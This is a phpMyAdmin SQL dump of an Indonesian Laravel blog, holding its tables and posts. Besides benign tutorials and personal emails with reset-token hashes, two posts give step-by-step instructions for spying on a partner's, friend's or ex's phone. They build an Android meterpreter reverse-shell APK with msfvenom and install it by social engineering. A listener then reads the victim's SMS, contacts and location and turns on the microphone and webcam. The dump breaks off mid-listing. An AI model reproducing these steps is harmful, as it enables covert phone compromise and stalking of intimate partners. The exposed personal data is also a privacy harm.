-- phpMyAdmin SQL Dump
-- version 4.9.5
-- https://www.phpmyadmin.net/
--
-- Host: localhost:3306
-- Generation Time: Oct 07, 2020 at 09:18 PM
-- Server version: 10.3.24-MariaDB
-- PHP Version: 7.3.6

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET AUTOCOMMIT = 0;
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Database: `spektawe_spektaweb`
--

-- --------------------------------------------------------

--
-- Table structure for table `migrations`
--

CREATE TABLE `migrations` (
  `id` int(10) UNSIGNED NOT NULL,
  `migration` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `batch` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `migrations`
--

INSERT INTO `migrations` (`id`, `migration`, `batch`) VALUES
(1, '2014_10_12_000000_create_users_table', 1),
(2, '2014_10_12_100000_create_password_resets_table', 1),
(3, '2020_07_10_115422_create_table_category', 2),
(4, '2020_07_10_133351_create_table_post', 3),
(5, '2020_07_11_234520_create_table_comment', 4),
(6, '2020_07_15_212946_create_table_category_portofolio', 5),
(7, '2020_07_15_213233_create_table_portofolio', 5),
(8, '2020_07_18_180014_create_table_contact', 6),
(9, '2020_07_20_193811_create_table_subscriber', 7),
(10, '2020_07_21_212929_create_table_visitor', 8),
(11, '2020_08_08_184454_create_roles_table', 9),
(12, '2020_08_08_195416_create_table_migration', 10);

-- --------------------------------------------------------

--
-- Table structure for table `password_resets`
--

CREATE TABLE `password_resets` (
  `email` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `token` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `password_resets`
--

INSERT INTO `password_resets` (`email`, `token`, `created_at`) VALUES
('yudainformatika125@gmail.com', '$2y$10$P5kahAjSVIRC.RRcYR2vneW7OO6QKLetTyPa7IwQHEcBFk5eNtRpu', '2020-08-09 12:05:26'),
('laracode125@gmail.com', '$2y$10$Wgp0gh4dfro/4kNGM7CDpOLtRXMx3n17.5YWXyY.L4MbBOWL0A/2W', '2020-08-10 10:29:10');

-- --------------------------------------------------------

--
-- Table structure for table `roles`
--

CREATE TABLE `roles` (
  `id` int(10) UNSIGNED NOT NULL,
  `nama` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `roles`
--

INSERT INTO `roles` (`id`, `nama`, `created_at`, `updated_at`) VALUES
(1, 'Admin', NULL, NULL);

-- --------------------------------------------------------

--
-- Table structure for table `tb_category`
--

CREATE TABLE `tb_category` (
  `id` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `nama` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `slug` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `jenis` enum('artikel','portofolio') COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `tb_category`
--

INSERT INTO `tb_category` (`id`, `nama`, `slug`, `jenis`, `created_at`, `updated_at`) VALUES
('34b95916-fe6e-4a1a-99b3-ffc621f75a10', 'Arduino', 'arduino', 'artikel', '2020-08-18 10:27:52', '2020-08-18 10:27:52'),
('35e961a8-56b7-4fa4-bb08-77d0d3e86c77', 'Software', 'software', 'artikel', '2020-07-18 05:49:32', '2020-07-18 05:49:32'),
('5288c5e0-acea-470e-ae3a-5816a184c0eb', 'Website', 'website', 'portofolio', '2020-07-16 10:59:22', '2020-07-20 11:57:29'),
('73549ed6-bfd6-4a20-bcea-c65b2354057f', 'Laravel', 'laravel', 'artikel', '2020-08-08 12:32:12', '2020-08-08 12:32:12'),
('c5fe72f7-a3ee-4fb1-99c3-0aa919dea785', 'Sistem Informasi', 'sistem-informasi', 'portofolio', '2020-07-20 11:57:44', '2020-07-20 11:57:44'),
('d27a833c-9d96-43de-9bf8-1801d5376318', 'Internet', 'internet', 'artikel', '2020-09-06 23:55:13', '2020-09-06 23:55:13'),
('de70a284-897a-4a78-882a-95390024bf56', 'Tutorial', 'tutorial', 'artikel', '2020-08-10 10:06:19', '2020-08-10 10:06:19');

-- --------------------------------------------------------

--
-- Table structure for table `tb_comment`
--

CREATE TABLE `tb_comment` (
  `id` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `artikel_id` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `role_id` int(11) NOT NULL DEFAULT 0,
  `nama` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `email` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `body` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `tb_comment`
--

INSERT INTO `tb_comment` (`id`, `artikel_id`, `role_id`, `nama`, `email`, `body`, `created_at`, `updated_at`) VALUES
('3a61612a-1cfd-4306-a211-a6dd93741d98', 'de74e8e7-344a-4dea-bf7d-4d26f1a3b4bd', 1, 'Yuda Muhtar', 'mangyuda@spektaweb.com', 'Sama sama gan', '2020-09-09 08:57:22', '2020-09-09 08:57:22'),
('457d2bfd-7329-4b37-9442-223466208572', 'de74e8e7-344a-4dea-bf7d-4d26f1a3b4bd', 0, 'Aldi', 'aldi@gmail.com', 'Terimakasih gan', '2020-09-08 12:21:40', '2020-09-08 12:21:40'),
('af668ea6-0c03-473d-a3ac-0129d25fdd3d', 'cc9183d3-3c21-4865-9725-e7f1834b417a', 0, 'Nanang Rahmat', 'Nrkamalwijaya22@gmail.com', 'Mantap. Kembangkan terus hobbimu brother supaya men jadi hobbimu penghasilanmu.', '2020-08-11 13:25:00', '2020-08-11 13:25:00'),
('de9dfc69-4faa-4113-94f0-42feb75ee4fd', 'b831b971-f758-49e3-9a13-7fb9d1fba91b', 0, 'anonim', 'anonim@gmail.com', 'Mantap', '2020-09-08 12:20:04', '2020-09-08 12:20:04'),
('fda4df70-16fd-4991-9bba-e661b9d6068f', 'cc9183d3-3c21-4865-9725-e7f1834b417a', 1, 'Yuda Muhtar', 'mangyuda@spektaweb.com', 'Hatur Nuhun nang', '2020-08-11 13:41:10', '2020-08-11 13:41:10');

-- --------------------------------------------------------

--
-- Table structure for table `tb_contact`
--

CREATE TABLE `tb_contact` (
  `id` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `nama` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `email` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `body` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `tb_contact`
--

INSERT INTO `tb_contact` (`id`, `nama`, `email`, `body`, `created_at`, `updated_at`) VALUES
('6b619acb-7b59-40de-8b71-25dca0d65bff', 'andre', 'andre@ganteng.com', 'hall0', '2020-09-23 05:37:40', '2020-09-23 05:37:40');

-- --------------------------------------------------------

--
-- Table structure for table `tb_post`
--

CREATE TABLE `tb_post` (
  `id` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `user_id` int(11) NOT NULL DEFAULT 1,
  `title` varchar(225) COLLATE utf8mb4_unicode_ci NOT NULL,
  `slug` varchar(225) COLLATE utf8mb4_unicode_ci NOT NULL,
  `image` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT 'default.png',
  `body` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `view_count` int(11) NOT NULL DEFAULT 0,
  `status` tinyint(1) NOT NULL DEFAULT 0,
  `category_id` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `jenis` enum('artikel','portofolio') COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `tb_post`
--

INSERT INTO `tb_post` (`id`, `user_id`, `title`, `slug`, `image`, `body`, `view_count`, `status`, `category_id`, `jenis`, `created_at`, `updated_at`) VALUES
('0804787e-6e19-4372-8fbd-22dcc098d81b', 1, '[ STUDI KASUS ] - Membuat Website PPDB Online Dengan Laravel #PART1 Install laravel', 'studi-kasus-membuat-website-ppdb-online-dengan-laravel-part1-install-laravel', '1599571238-Picture3 (2).jpg', '<div style=\"text-align: justify;\"><span style=\"font-size: 1rem;\">Hallo semuanya, kali ini kita akan membuat sebuah website PPDB Online sederhana menggunakan Laravel. Namun sebelum itu kalian harus menginstal terlebih dahulu hal yang diperlukan untuk menunjang pembuatan wesite ppdb ini.&nbsp; </span></div><div style=\"text-align: justify;\"><span style=\"font-size: 1rem;\"><br></span></div><div style=\"text-align: justify;\"><span style=\"font-size: 1rem;\">1. Composer</span></div><div style=\"text-align: justify;\">2. Web server ( disini saya menggunakan xampp )<span style=\"font-size: 1rem;\"><br></span></div><div style=\"text-align: justify;\"><span style=\"font-size: 1rem;\">3. Laravel ( saya menggunakan versi 5.8 )</span></div><div style=\"text-align: justify;\"><br></div><div style=\"text-align: justify;\">ok langsung saja cekidot ..</div><div style=\"text-align: justify;\"><br></div><div style=\"text-align: justify;\">1. Install composer</div><div style=\"text-align: justify;\"><span style=\"font-size: 1rem;\">Kalian bisa buka link ini untuk mendownload nya :&nbsp;</span><a href=\"https://getcomposer.org/\" target=\"_blank\" style=\"background-color: rgb(255, 255, 255); font-size: 1rem;\"><b>DOWNLOAD COMPOSER</b></a></div><div style=\"text-align: justify;\"><a href=\"https://getcomposer.org/\" target=\"_blank\"><b><br></b></a></div><div style=\"text-align: justify;\">2. Install xampp</div><div style=\"text-align: justify;\"><span style=\"font-size: 1rem;\">Kalian bisa buka link ini untuk mendownload nya :</span><b style=\"font-size: 1rem;\">&nbsp;</b><a href=\"https://www.apachefriends.org/index.html\" target=\"_blank\" style=\"background-color: rgb(255, 255, 255); font-size: 1rem;\"><b>DOWNLOAD XAMPP</b></a></div><div style=\"text-align: justify;\"><br></div><div style=\"text-align: justify;\"><span style=\"font-size: 1rem;\">3. Install laravel</span><br></div><div style=\"text-align: justify;\"><span style=\"font-size: 1rem;\"><br></span></div><div style=\"text-align: justify;\"><pre class=\"hljs cs\" style=\"font-size: 14px; padding: 0.5em; border-radius: 5px; background: rgb(40, 44, 52); text-align: left;\"><code style=\"\"><div style=\"text-align: justify; \" droid=\"\" sans=\"\" mono\",=\"\" monospace,=\"\" \"droid=\"\" fallback\";=\"\" line-height:=\"\" 19px;\"=\"\"><span style=\"color: rgb(209, 154, 102);\">composer</span><font color=\"#abb2bf\"> </font><span style=\"color: rgb(209, 154, 102);\">create-project</span><font color=\"#abb2bf\"> </font><span style=\"color: rgb(209, 154, 102);\">--prefer-dist</span><font color=\"#abb2bf\"> </font><span style=\"color: rgb(209, 154, 102);\">laravel</span><span style=\"color: rgb(255, 255, 255);\">/laravel</span><font color=\"#abb2bf\"> </font><font color=\"#d19a66\">ppdb</font><font color=\"#abb2bf\"> </font><span style=\"color: rgb(255, 255, 255);\">\"5.8.*\"</span></div></code></pre><p style=\"color: rgb(33, 37, 41); font-family: -apple-system, BlinkMacSystemFont, \" segoe=\"\" ui\",=\"\" roboto,=\"\" \"helvetica=\"\" neue\",=\"\" arial,=\"\" \"noto=\"\" sans\",=\"\" sans-serif,=\"\" \"apple=\"\" color=\"\" emoji\",=\"\" \"segoe=\"\" ui=\"\" symbol\",=\"\" emoji\";=\"\" text-align:=\"\" left;\"=\"\">*untuk tulisan \"ppdb\" di atas bisa di ubah sesuai nama project kita.</p><p style=\"color: rgb(33, 37, 41); font-family: -apple-system, BlinkMacSystemFont, \" segoe=\"\" ui\",=\"\" roboto,=\"\" \"helvetica=\"\" neue\",=\"\" arial,=\"\" \"noto=\"\" sans\",=\"\" sans-serif,=\"\" \"apple=\"\" color=\"\" emoji\",=\"\" \"segoe=\"\" ui=\"\" symbol\",=\"\" emoji\";=\"\" text-align:=\"\" left;\"=\"\">ok mungkin segitunya saja part1 kali ini, mohon maaf bila ada yang salah dalam penulisan, silahkan share apa yang kalian tahu agar orang lain juga bisa tahu. jika ada yang kurang jelas silahkan beri masukan di kolom komentar. Nantikan artikel selanjutnya. Terimakasih.</p></div><div style=\"text-align: justify;\"><span style=\"font-size: 1rem;\">&nbsp;</span></div>', 14, 1, '73549ed6-bfd6-4a20-bcea-c65b2354057f', 'artikel', '2020-09-08 13:04:09', '2020-10-06 15:31:04'),
('3a9e54c0-2e72-404c-b7bb-81054fb77ce2', 1, 'Situs Edit Foto Online Yang Mirip dengan Photoshop', 'situs-edit-foto-online-yang-mirip-dengan-photoshop', '1599437831-photopea-min.png', '<div style=\"text-align: justify;\"><span style=\"font-size: 1rem;\"><b>Situs Edit Foto Online Yang Mirip dengan Photoshop ~ </b>Hallo semuanya, Kali ini saya akan share sebuah situs atau website yang bisa edit photo secara online dengan mudah dan pastinya bagi kalian yang suka oprek-oprek photoshop atau pernah melihat nya maka tampilan website ini tidak asing karena tool nya hampir sama dan mirip walaupun tidak sekomplit apilikasi photoshop asli. Berikut Penamkan nya :</span></div><div style=\"text-align: justify;\"><span style=\"font-size: 1rem;\"><br></span></div><div style=\"text-align: justify;\"><img src=\"https://spektaweb.com/artikel/spektaweb.com-min.png\" style=\"width: 100%;\"><span style=\"font-size: 1rem;\"><br></span><span style=\"font-size: 1rem;\">&nbsp;</span></div><div style=\"text-align: justify;\"><span style=\"font-size: 1rem;\">Untuk situsnya kalian bisa kunjungi di :&nbsp;</span><a href=\"https://www.photopea.com/\" target=\"_blank\"><b>https://www.photopea.com/</b></a></div>', 12, 1, 'd27a833c-9d96-43de-9bf8-1801d5376318', 'artikel', '2020-09-07 00:17:19', '2020-09-08 12:19:21'),
('3d6b83f1-340f-44e7-93b4-c77b85d6275f', 1, 'Cara Mudah Mengerjakan Soal Matematika Dengan Apilikasi', 'cara-mudah-mengerjakan-soal-matematika-dengan-apilikasi', '1599412131-1597632556-mathtmb-min.png', '<p>                                             </p><div style=\"text-align: justify;\"><b style=\"font-size: 1rem;\">Cara Mudah Mengerjakan Soal Matematika Dengan Apilikasi   - </b><span style=\"font-size: 1rem;\">Hallo Semuanya, sekarang saya akan meriview sebuah apilikasi yang pastinya sangat bermafaat bagi kita terutama buat anak sekolah hehe, Apilikasi ini dapat mengerjakan soal matematika dengan cepat dan mudah hanya dengan mengarahkan kamera ke soal dan jeng jengg hasil nya keluar berikut dengan jawaban nya. Contohnya seperti video dibawah ini :</span></div><div style=\"text-align: justify;\"><br></div>\r\n<div style=\"text-align: justify;\"><iframe scrolling=\"no\" marginheight=\"0\" marginwidth=\"0\" type=\"text/html\" src=\"https://www.youtube.com/embed/Qu0a86ZszzU?autoplay=1&fs=1&iv_load_policy=3&showinfo=0&rel=0&cc_load_policy=0&start=0&end=0&vq=hd720&origin=https://youtubeembedcode.com\" style=\"font-size: 1rem;\" allow=\"accelerometer; encrypted-media; gyroscope; picture-in-picture\" allowfullscreen=\"\" width=\"100%\" height=\"443\" frameborder=\"0\"></iframe><span style=\"font-size: 1rem;\"> </span></div><span style=\"font-size: 1rem;\"><div style=\"text-align: justify;\"><span style=\"font-size: 1rem;\">Tapi inget jangan disalahgunakan apilikasi ini untuk berbuat curang, jadikanlah apilikasi ini buat belajar suapaya kita  tau step by step dalam pengerjaan ya. silahkan share artikel ini jika bermanfaat buat kalian, supaya apa yang kalian tahu orang lain juga menjadi tahu. Termikasih. Link Download di </span><a href=\"http://raboninco.com/1mmdA\" target=\"_blank\"><b>SINI</b></a></div></span><p></p>', 19, 1, '35e961a8-56b7-4fa4-bb08-77d0d3e86c77', 'artikel', '2020-08-17 01:23:46', '2020-09-25 09:55:24'),
('464e1aaf-0fa8-4fa9-94ad-89fcc2e1acd7', 1, 'Cara Sadap HP Pacar, Teman Atau Mantan Dengan Metasploit #Part1', 'cara-sadap-hp-pacar-teman-atau-mantan-dengan-metasploit-part1', '1599435049-1599412518-1597551950-msf3-min-min-min.png', '<div style=\"text-align: justify;\"><font face=\"Source Sans Pro\">Sebelum kita melakukan penyadapan alangkah baiknya kita mengetahui terlebih dahulu apa itu Metasploit. jadi, Metasploit adalah sebuah proyek keamanan komputer yang dapat menyediakan informasi tentang kerentanan keamanan dan membantu dalam pengujian penetrasi dan pengembangan signature IDS. Metasploit memiliki beberapa sub proyek. Metasloit merupakan software security yang sering digunakan untuk menguji cob tahanan suatu sistem dengan cara mengeksploitasi kelemahan software suatu sistem. Dan tanpa basa basi lagi cekidot ..</font></div><div style=\"text-align: justify;\"><font face=\"Source Sans Pro\"><br></font></div><div style=\"text-align: justify;\"><font face=\"Source Sans Pro\">1. Download terlebih dahulu Metasploit nya di  </font><a href=\"https://www.metasploit.com/\" target=\"_blank\"><b>SINI</b></a></div><div style=\"text-align: justify;\"><font face=\"Source Sans Pro\">2. Buka Terminal / Cmd di Laptop Kita, lalu ketikan perintah <b>ip config / ip adrress </b>untuk mengecek ip adrres kita.</font></div><div style=\"text-align: justify;\"><font face=\"Source Sans Pro\"><br></font></div><div style=\"text-align: justify;\"><img style=\"width: 100%;\" src=\"https://spektaweb.com/artikel/msf1-min.png\"><font face=\"Source Sans Pro\"><b><br></b></font></div><div style=\"text-align: justify;\"><font face=\"Source Sans Pro\"><br></font></div><div style=\"text-align: justify;\">3. Membuat Backdoor berupa file apk untuk di tanam di HP Korban.</div><div style=\"text-align: justify;\"><pre style=\"text-align: left;\"><code class=\"hljs sql\" style=\"text-align: justify; overflow-wrap: break-word; padding: 0.5em; background: rgb(35, 36, 31); border-radius: 4px; display: block; overflow-x: auto;\"><font color=\"#f8f8f2\"><span style=\"font-size: 15.75px;\">msfvenom -p android/meterpreter/reverse_tcp lhost=ip address kita lport=terserah -a dalvik platform android R -o nama_aplikasi.apk<br></span></font></code></pre></div><p></p><p style=\"text-align: justify;\"><img style=\"width: 100%;\" src=\"https://spektaweb.com/artikel/msf2-min.png\"><br></p><p style=\"text-align: justify;\">dan backdoor berhasil dibuat.</p><p style=\"text-align: justify;\">3. Melakukan social enginering bisa dengan cara meminjam hp nya dan langsung kalian install</p><p style=\"text-align: justify;\">4. Setelah di install di HP Korban, selanjut nya kalian buka Metasploit di terminal dengan cara mengetikan </p><div style=\"text-align: justify;\"><pre style=\"font-size: 14px; text-align: left;\"><code class=\"hljs sql\" style=\"text-align: justify; overflow-wrap: break-word; padding: 0.5em; background: rgb(35, 36, 31); border-radius: 4px; display: block; overflow-x: auto;\"><font color=\"#f8f8f2\"><span style=\"font-size: 15.75px;\">msfconsole</span></font></code></pre></div><p></p><p style=\"text-align: justify;\">maka akan tampil seperti berikut, dan kalian bisa mengganti banner nya dengan mengetikan <b>banner </b>pada terimal.</p><p style=\"text-align: justify;\"><img style=\"width: 100%;\" src=\"https://spektaweb.com/artikel/msf3-min.png\"><br></p><p style=\"text-align: justify;\">4. Melakukan Exploit ke HP Korban dengan cara</p><div style=\"text-align: justify;\"><pre style=\"text-align: left;\"><code class=\"hljs sql\" style=\"overflow-wrap: break-word; padding: 0.5em; background: rgb(35, 36, 31); border-radius: 4px; display: block; overflow-x: auto;\"><div style=\"text-align: justify;\"><span style=\"font-size: 15.75px; color: rgb(248, 248, 242);\">use exploit/multi/handler</span></div><font color=\"#f8f8f2\"><div style=\"text-align: justify;\"><span style=\"font-size: 15.75px;\">set payload android/meterpreter/reverse_tcp</span></div><span style=\"font-size: 15.75px;\">set lhost ip addres kalian\r\n<div style=\"text-align: justify;\">set lport 4444 ( terserah )</div><div style=\"text-align: justify;\">run</div></span></font></code></pre></div>\r\n<p style=\"text-align: justify;\">jika sudah seperti ini berarti kalian sudah masuk ke HP Korban.</p><p style=\"text-align: justify;\"><img style=\"width: 100%;\" src=\"https://spektaweb.com/artikel/msf4-min.png\"><br></p><p style=\"text-align: justify;\">ketikan <b>help</b>, dan kalian bisa melakukan apa saja dengan HP Korban</p><p style=\"text-align: justify;\"><img style=\"width: 100%;\" src=\"https://spektaweb.com/artikel/msf5-min.png\"><br></p><p style=\"text-align: justify;\">Sekian Tutorial kali ini, jika ada yang salah dalam penulisan atau apapun itu harap di maklumi karena saya juga masih belajar, dan saya berharap tutorial ini tidak disalah gunakan karena sekarang UU ITE sudah sangat ketat, dan saya tidak bertanggung jawab dengan segala penyalahgunaan yang kalian lakukan. Sekian dan terimakasih.</p>', 35, 1, 'de70a284-897a-4a78-882a-95390024bf56', 'artikel', '2020-08-12 15:09:20', '2020-10-02 08:41:50'),
('46fc1fb3-9088-4f05-860d-bca513174880', 1, 'Menggabungkan Laravel Dengan AdminLTE Kurang Dari 5 Menit', 'menggabungkan-laravel-dengan-adminlte-kurang-dari-5-menit', '1599411475-1597847024-Screenshot_2020-08-19-21-02-42-min.png', '<p align=\"justify\">AdminLTE adalah template Backend sejuta umat karena seringnya digunakan oleh para developer, selain tampilan nya yang enak dilihat, fitur-fitur yang tersedia didalam nya juga pun dirasa cukup komplit. Nah disini saya akan mencoba menggabungkan project laravel dengan AdminLTE lebih cepat dan mudah dan tanpa basa basi lagi cekidot .. </p> <center><a href=\"https://www.youtube.com/watch?v=jUrxOyZ06s4\" class=\"btn btn-danger\"> Tonton Dichannel saya </a></center>', 33, 1, '73549ed6-bfd6-4a20-bcea-c65b2354057f', 'artikel', '2020-08-19 14:12:26', '2020-10-03 20:08:18'),
('739ba8bf-1e76-47db-86d4-8169f4f9fd75', 1, 'E-book Arduino GRATIS Untuk Pemula ! Bisa Langsung Praktek', 'e-book-arduino-gratis-untuk-pemula-bisa-langsung-praktek', '1599411533-1597748554-New Project-min.jpg', '<div style=\"text-align: justify;\"><span style=\"font-size: 1rem;\"><b>E-book Arduino GRATIS Untuk Pemula ! Bisa Langsung Praktek</b>  - Hallo semuanya, kali ini saya akan membagikan 2 buah E-book gratis Arduino untuk pemula, bagi kalian yang ingin belajar arduino dari dasar dan ingin bisa langsung praktek saya rasa e-book ini sangat cocok untuk anda. </span></div><div style=\"text-align: justify;\"><span style=\"font-size: 1rem;\">Berikut link download nya :</span></div><div style=\"text-align: justify;\"><b><br></b></div><div style=\"text-align: justify;\"><a href=\"http://raboninco.com/1nznc\" target=\"_blank\"><b>E-book 1</b></a></div><div style=\"text-align: justify;\"><a href=\"http://raboninco.com/1nzp4\" target=\"_blank\"><b>E-book 2</b></a></div><div style=\"text-align: justify;\"><br></div><div style=\"text-align: justify;\"><br><br><br></div>', 14, 1, '34b95916-fe6e-4a1a-99b3-ffc621f75a10', 'artikel', '2020-08-18 11:01:55', '2020-10-01 00:36:53'),
('81d7f972-79be-4864-8356-09c30cf50f3c', 1, 'Cara Melacak HP Dengan Metasploit #Part2', 'cara-melacak-hp-dengan-metasploit-part2', '1599412636-1597551308-msf2.3-min-min.png', '<div style=\"text-align: justify;\"><b style=\"font-size: 1rem;\"><span style=\"font-family: \" source=\"\" sans=\"\" pro\";\"=\"\">Cara Melacak HP Dengan Metasploit #Part2 - </span></b><span style=\"font-size: 1rem; font-family: \" source=\"\" sans=\"\" pro\";\"=\"\">Ok di part sebelum nya saya telah memeberikan tutorial bagaimana cara membuat backdoor berupa file Apk,  serta cara menginstall dan mengexploit HP Korban. Di Tutorial kali ini kita  akan mencoba melacak HP Korban dengan command / perintah-perintah yang ada pada metasploit, tanpa basa basi lagi cekidot ...</span></div><div style=\"text-align: justify;\"><span style=\"font-size: 1rem;\"><br></span></div><div style=\"text-align: justify;\"><span style=\"font-size: 1rem; font-family: \" source=\"\" sans=\"\" pro\";\"=\"\">1. Pastikan Kalian sudah mengikuti Tutorial di Part1 kalian bisa lihat di </span><a href=\"https://spektaweb.com/detail_post/cara-sadap-hp-pacar-teman-atau-mantan-dengan-metasploit-part1\" target=\"_blank\"><span style=\"color: rgb(0, 0, 255); background-color: rgb(255, 255, 255);\" source=\"\" sans=\"\" pro\";\"=\"\"><b>SINI</b></span></a></div><div style=\"text-align: justify;\"><span style=\"font-family: \" source=\"\" sans=\"\" pro\";\"=\"\">2. Saya asumsikan kalian sudah masuk ke HP Korban, seperti gambar berikut :<br></span><br></div><div style=\"text-align: justify;\"><img style=\"width: 100%;\" src=\"https://spektaweb.com/artikel/msf2.1-min.png\"><br></div><div style=\"text-align: justify;\"><br></div><div style=\"text-align: justify;\"><span style=\"font-family: \" source=\"\" sans=\"\" pro\";\"=\"\">3. ketikan</span><b><span style=\"font-family: \" source=\"\" sans=\"\" pro\";\"=\"\"> help </span></b><span style=\"font-family: \" source=\"\" sans=\"\" pro\";\"=\"\">untuk melihat perintah-perintah yang ada, seperti berikut :</span></div><div style=\"text-align: justify;\"><pre style=\"text-align: left;\"><code class=\"hljs sql\" style=\"overflow-wrap: break-word; padding: 0.5em; background: rgb(35, 36, 31); border-radius: 4px; display: block; overflow-x: auto;\"><div style=\"text-align: justify;\"><font color=\"#f8f8f2\"><span style=\"font-size: 15.75px; font-family: \" source=\"\" sans=\"\" pro\";\"=\"\">meterpreter > help\r\n\r\nCore Commands\r\n=============\r\n\r\n    Command                   Description\r\n    -------                   -----------\r\n    ?                         Help menu\r\n    background                Backgrounds the current session\r\n    bg                        Alias for background\r\n    bgkill                    Kills a background meterpreter script\r\n    bglist                    Lists running background scripts\r\n    bgrun                     Executes a meterpreter script as a background thread\r\n    channel                   Displays information or control active channels\r\n    close                     Closes a channel\r\n    disable_unicode_encoding  Disables encoding of unicode strings\r\n    enable_unicode_encoding   Enables encoding of unicode strings\r\n    exit                      Terminate the meterpreter session\r\n    get_timeouts              Get the current session timeout values\r\n    guid                      Get the session GUID\r\n    help                      Help menu\r\n    info                      Displays information about a Post module\r\n    irb                       Open an interactive Ruby shell on the current session\r\n    load                      Load one or more meterpreter extensions\r\n    machine_id                Get the MSF ID of the machine attached to the session\r\n    pry                       Open the Pry debugger on the current session\r\n    quit                      Terminate the meterpreter session\r\n    read                      Reads data from a channel\r\n    resource                  Run the commands stored in a file\r\n    run                       Executes a meterpreter script or Post module\r\n    secure                    (Re)Negotiate TLV packet encryption on the session\r\n    sessions                  Quickly switch to another session\r\n    set_timeouts              Set the current session timeout values\r\n    sleep                     Force Meterpreter to go quiet, then re-establish session.\r\n    transport                 Change the current transport mechanism\r\n    use                       Deprecated alias for \"load\"\r\n    uuid                      Get the UUID for the current session\r\n    write                     Writes data to a channel\r\n\r\n\r\nStdapi: File system Commands\r\n============================\r\n\r\n    Command       Description\r\n    -------       -----------\r\n    cat           Read the contents of a file to the screen\r\n    cd            Change directory\r\n    checksum      Retrieve the checksum of a file\r\n    cp            Copy source to destination\r\n    dir           List files (alias for ls)\r\n    download      Download a file or directory\r\n    edit          Edit a file\r\n    getlwd        Print local working directory\r\n    getwd         Print working directory\r\n    lcd           Change local working directory\r\n    lls           List local files\r\n    lpwd          Print local working directory\r\n    ls            List files\r\n    mkdir         Make directory\r\n    mv            Move source to destination\r\n    pwd           Print working directory\r\n    rm            Delete the specified file\r\n    rmdir         Remove directory\r\n    search        Search for files\r\n    upload        Upload a file or directory\r\n\r\n\r\nStdapi: Networking Commands\r\n===========================\r\n\r\n    Command       Description\r\n    -------       -----------\r\n    ifconfig      Display interfaces\r\n    ipconfig      Display interfaces\r\n    portfwd       Forward a local port to a remote service\r\n    route         View and modify the routing table\r\n\r\n\r\nStdapi: System Commands\r\n=======================\r\n\r\n    Command       Description\r\n    -------       -----------\r\n    execute       Execute a command\r\n    getuid        Get the user that the server is running as\r\n    localtime     Displays the target system\'s local date and time\r\n    pgrep         Filter processes by name\r\n    ps            List running processes\r\n    shell         Drop into a system command shell\r\n    sysinfo       Gets information about the remote system, such as OS\r\n\r\n\r\nStdapi: User interface Commands\r\n===============================\r\n\r\n    Command       Description\r\n    -------       -----------\r\n    screenshare   Watch the remote user\'s desktop in real time\r\n    screenshot    Grab a screenshot of the interactive desktop\r\n\r\n\r\nStdapi: Webcam Commands\r\n=======================\r\n\r\n    Command        Description\r\n    -------        -----------\r\n    record_mic     Record audio from the default microphone for X seconds\r\n    webcam_chat    Start a video chat\r\n    webcam_list    List webcams\r\n    webcam_snap    Take a snapshot from the specified webcam\r\n    webcam_stream  Play a video stream from the specified webcam\r\n\r\n\r\nStdapi: Audio Output Commands\r\n=============================\r\n\r\n    Command       Description\r\n    -------       -----------\r\n    play          play a waveform audio file (.wav) on the target system\r\n\r\n\r\nAndroid Commands\r\n================\r\n\r\n    Command           Description\r\n    -------           -----------\r\n    activity_start    Start an Android activity from a Uri string\r\n    check_root        Check if device is rooted\r\n    dump_calllog      Get call log\r\n    dump_contacts     Get contacts list\r\n    dump_sms          Get sms messages\r\n    geolocate         Get current lat-long using geolocation\r\n    hide_app_icon   